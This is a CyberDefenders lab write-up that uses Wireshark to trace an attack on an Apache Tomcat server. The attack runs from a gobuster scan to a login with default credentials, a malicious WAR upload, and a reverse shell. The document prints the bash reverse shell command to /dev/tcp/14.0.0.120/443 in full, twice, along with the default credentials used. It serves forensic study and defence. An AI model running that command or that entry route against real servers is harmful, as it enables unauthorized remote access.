| title | Tomcat Takeover |
| :--- | :--- |
| **platform** | CyberDefenders |
| **category** | Network Forensics |
| **difficulty** | Easy |
| **skills** | Wireshark packet analysis, HTTP protocol analysis, directory enumeration, default credential exploitation, malicious WAR webshell analysis, reverse shell detection |

# Tomcat Takeover — CyberDefenders

## Scenario
Suspicious traffic was observed targeting an internal web server hosting an Apache Tomcat instance. A full packet capture (PCAP) was collected to analyze the intrusion and reconstruct the attacker's path from initial scanning to remote command execution.

## Objective
Analyze the network capture to reconstruct the complete attack chain, identify the attacker's source and tooling, isolate the compromised credentials, identify the malicious payload uploaded to Tomcat Manager, and determine the persistence/reverse shell mechanism used.

## Methodology

### 1. Attacker Identification & Initial Scanning
To isolate initial connection attempts and port scanning behavior, filtered for TCP SYN packets without the ACK flag set:
```wireshark
tcp.flags.syn == 1 and tcp.flags.ack == 0
```
This identified `14.0.0.120` making high-volume connection attempts across multiple ports, eventually focusing heavy scanning on port `8080` (the Apache Tomcat interface).

### 2. Directory Enumeration
Filtered on HTTP GET requests from the attacker to inspect web reconnaissance:
```wireshark
ip.src == 14.0.0.120 and http.request.method == GET
```
- The `User-Agent` header confirmed the enumeration tool used was `gobuster`.
- Gobuster brute-forcing discovered the Tomcat administrative interface at `/manager`.

### 3. Credential Access & Web Management Access
Examined the HTTP stream targeting the manager application (`GET /manager/images/tomcat.gif`). Inspecting the `Authorization: Basic` header revealed successful authentication using default credentials:
- Username: `admin`
- Password: `tomcat`

### 4. Malicious WAR Deployment
Searched for deployment requests to the Tomcat Manager application:
```wireshark
http.request.method == POST and http contains "filename="
```
Followed the TCP stream for the upload transaction to find the multipart form data:
```http
Content-Disposition: form-data; name="deployWar"; filename="JXQOZY.war"
```
The attacker uploaded a malicious web application archive (`JXQOZY.war`). A subsequent request (`GET /JXQOZY/ HTTP/1.1`) verified that Tomcat auto-deployed the archive and the attacker initiated code execution through the deployed webshell.

### 5. Reverse Shell Execution & C2
Searched the packet payload for standard Unix shell redirection strings:
```wireshark
tcp contains ">&"
```
Following the stream from `14.0.0.120` uncovered the interactive bash reverse shell command executed via the webshell:
```bash
/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
```
This established an outbound interactive shell to `14.0.0.120:443`, giving the attacker remote access to the host under the Tomcat service account.

## Key Findings / IOCs
- **Attacker IP:** `14.0.0.120`
- **Reconnaissance Tool:** Gobuster (identified via HTTP `User-Agent`)
- **Compromised Credentials:** `admin:tomcat` (HTTP Basic Auth)
- **Target Endpoint:** `http://<target-ip>:8080/manager`
- **Malicious Payload:** `JXQOZY.war` (deployed via Tomcat Manager)
- **C2 / Reverse Shell:** `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'` on port 443

## Lessons Learned
- **Disable or Restrict Management Interfaces:** Tomcat Manager should never be exposed to untrusted subnets. Access should be locked down via IP allowlisting (`RemoteAddrValve` in `context.xml`) or disabled entirely if not needed in production.
- **Enforce Credential Hygiene:** The initial compromise relied entirely on standard default credentials (`admin:tomcat`). Weak or default credentials in management consoles remain a trivial entry point for unauthorized WAR deployments.
- **Egress Filtering:** The web server was permitted to establish arbitrary outbound TCP connections to the public internet on port 443. Enforcing strict egress filtering on server subnets prevents reverse shell payloads from reaching attacker infrastructure.
- **Detection Engineering:** Alerting on `POST` requests to `/manager/html/upload` or `/manager/text/deploy` would detect unauthorized application deployments, while monitoring process execution trees for `/bin/bash` spawned under Tomcat/Java processes provides direct endpoint detection.
